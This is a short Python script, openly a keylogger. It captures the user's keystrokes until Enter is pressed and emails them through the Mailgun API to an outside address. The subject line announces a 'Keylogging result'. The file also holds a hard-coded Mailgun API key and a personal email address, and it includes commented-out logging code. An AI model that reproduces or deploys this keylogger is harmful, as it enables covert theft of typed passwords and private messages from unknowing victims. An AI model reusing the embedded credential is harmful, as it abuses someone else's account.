import keyboard
import requests
import datetime
import time
'''
def file_input(recorded):
    now_time = datetime.datetime.now()
    w = open("LOG.txt", 'a')

    w.write(recorded)
    w.write("\n")
    w.write(now_time)
    w.write("--------------------------------------")
    w .close()
'''
def send_simple_message(file_content):
    return requests.post(
        "https://api.mailgun.net/v3/mg.ladmail.com/messages",
        auth=("api", "key-a65a55fe6f78da49a3addfd94fa83b87"),
        data={"from": "PYKEYLOGGER <postmaster@mg.ladmail.com>",
              "to": "lad <hth225@gmail.com>",
              "subject": "Hello lad, Here is Keylogging result",
              "text":  file_content })

if __name__ == "__main__":
    f = open("LOG.txt", 'r')
    file_content = f.read()
    f.close()
    status = time.localtime()
    result = []

    keyboard.press_and_release('space')

    recorded = keyboard.record(until='enter')
    #recorded.

    '''
    file_input(recorded)
    now_time = datetime.datetime.now()
    w = open("LOG.txt", 'a+t')
    w.writelines(recorded)
    w.write("\n")
    w.write(now_time)
    w.write("--------------------------------------")
    w.close()

    if(status.tm_min == 30):
    '''
    send_simple_message(recorded)



    #result = keyboard.play(recorded)

    #send_simple_message(result)